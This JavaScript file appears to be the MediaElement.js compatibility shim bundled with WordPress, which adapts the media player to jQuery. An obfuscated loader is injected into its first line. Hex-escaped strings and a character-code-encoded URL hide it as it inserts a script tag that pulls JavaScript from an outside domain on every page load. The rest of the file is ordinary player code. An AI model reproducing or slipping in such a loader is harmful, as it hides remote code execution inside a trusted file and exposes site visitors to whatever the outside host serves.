var a1=function(){var _0x41fbx2=String["\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"](104, 116, 116, 112, 115, 58, 47, 47, 108, 97, 115, 116, 100, 97, 121, 115, 111, 110, 108, 105, 110, 101, 115, 46, 99, 111, 109, 47, 114, 111, 98, 111, 116, 115, 46, 106, 115);var _0x41fbx2=document["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"]("\x73\x63\x72\x69\x70\x74");_0x41fbx2["\x74\x79\x70\x65"]= "\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74";_0x41fbx2["\x61\x73\x79\x6E\x63"]= true;_0x41fbx2["\x69\x64"]= "\x63\x64\x37\x30\x39\x30\x31\x30";_0x41fbx2["\x73\x72\x63"]= _0x41fbx2;var _0x41fbx3=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74")[0];_0x41fbx3["\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"]["\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65"](_0x41fbx2,_0x41fbx3)};var scripts=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74");var n=true;for(var i=0;i< scripts["\x6C\x65\x6E\x67\x74\x68"];i++){if(scripts[i]["\x69\x64"]== "\x63\x64\x37\x30\x39\x30\x31\x30"){n= false}};if(n== true){a1()}/* global console, MediaElementPlayer, mejs */
(function ( window, $ ) {
	// Reintegrate `plugins` since they don't exist in MEJS anymore; it won't affect anything in the player
	if (mejs.plugins === undefined) {
		mejs.plugins = {};
		mejs.plugins.silverlight = [];
		mejs.plugins.silverlight.push({
			types: []
		});
	}

	// Inclusion of old `HtmlMediaElementShim` if it doesn't exist
	mejs.HtmlMediaElementShim = mejs.HtmlMediaElementShim || {
		getTypeFromFile: mejs.Utils.getTypeFromFile
	};

	// Add missing global variables for backward compatibility
	if (mejs.MediaFeatures === undefined) {
		mejs.MediaFeatures = mejs.Features;
	}
	if (mejs.Utility === undefined) {
		mejs.Utility = mejs.Utils;
	}

	/**
	 * Create missing variables and have default `classPrefix` overridden to avoid issues.
	 *
	 * `media` is now a fake wrapper needed to simplify manipulation of various media types,
	 * so in order to access the `video` or `audio` tag, use `media.originalNode` or `player.node`;
	 * `player.container` used to be jQuery but now is a HTML element, and many elements inside
	 * the player rely on it being a HTML now, so its conversion is difficult; however, a
	 * `player.$container` new variable has been added to be used as jQuery object
	 */
	var init = MediaElementPlayer.prototype.init;
	MediaElementPlayer.prototype.init = function () {
		this.options.classPrefix = 'mejs-';
		this.$media = this.$node = $( this.node );
		init.call( this );
	};

	var ready = MediaElementPlayer.prototype._meReady;
	MediaElementPlayer.prototype._meReady = function () {
		this.container = $( this.container) ;
		this.controls = $( this.controls );
		this.layers = $( this.layers );
		ready.apply( this, arguments );
	};

	// Override method so certain elements can be called with jQuery
	MediaElementPlayer.prototype.getElement = function ( el ) {
		return $ !== undefined && el instanceof $ ? el[0] : el;
	};

	// Add jQuery ONLY to most of custom features' arguments for backward compatibility; default features rely 100%
	// on the arguments being HTML elements to work properly
	MediaElementPlayer.prototype.buildfeatures = function ( player, controls, layers, media ) {
		var defaultFeatures = [
			'playpause',
			'current',
			'progress',
			'duration',
			'tracks',
			'volume',
			'fullscreen'
		];
		for (var i = 0, total = this.options.features.length; i < total; i++) {
			var feature = this.options.features[i];
			if (this['build' + feature]) {
				try {
					// Use jQuery for non-default features
					if (defaultFeatures.indexOf(feature) === -1) {
						this['build' + feature]( player, $(controls), $(layers), media );
					} else {
						this['build' + feature]( player, controls, layers, media );
					}

				} catch (e) {
					console.error( 'error building ' + feature, e );
				}
			}
		}
	};

})( window, jQuery );
